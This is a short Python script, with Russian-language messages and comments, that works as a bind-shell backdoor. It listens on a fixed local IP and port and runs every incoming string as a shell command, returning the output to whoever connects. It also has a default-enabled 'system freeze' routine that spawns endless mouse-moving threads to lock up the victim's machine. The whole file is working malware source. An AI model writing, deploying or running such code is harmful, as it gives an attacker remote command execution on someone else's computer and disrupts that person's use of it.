import socket
import subprocess
import pyautogui
import time
import threading
import os

def move():
    pyautogui.moveTo(100, 100)
    time.sleep(0.5)
    pyautogui.moveTo(500, 500)
    time.sleep(0.5)
    # pyautogui.click(50, 50)
    

def main():
    global data
    exclusion_commands = {
        "cd": os.chdir,
    }
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("192.168.0.171", 8080))

    server.listen()
    user, adress = server.accept()

    while True:
        data = user.recv(1024).decode("utf-8")
        if data.split()[0] in exclusion_commands:
            try:
                os.chdir(data.split()[1])
            except:
                user.send("[ERROR] Такой директории не существует.".encode("utf-8"))
            else:
                user.send("[INFO] Директория успешно сменена.".encode("utf-8"))
        else:
            terminal_response = subprocess.getoutput(data)
            if terminal_response:
                user.send(terminal_response.encode("utf-8"))
            else:
                user.send("...".encode("utf-8"))
    
def start(kill=False):  
    try:
        thread2 = threading.Thread(target=main)
        thread2.start()
        if kill:
            while "a" not in os.listdir():   
                thread = threading.Thread(target=move)
                thread.start()
            
    except:
        ...
       
MASSIVE_SYSTEM_FREEZE = 1  # Не советую ставить единицу, 
                           # если вы запускаете клиент и сервер 
                           # на одном устройстве.
                           
start(MASSIVE_SYSTEM_FREEZE)
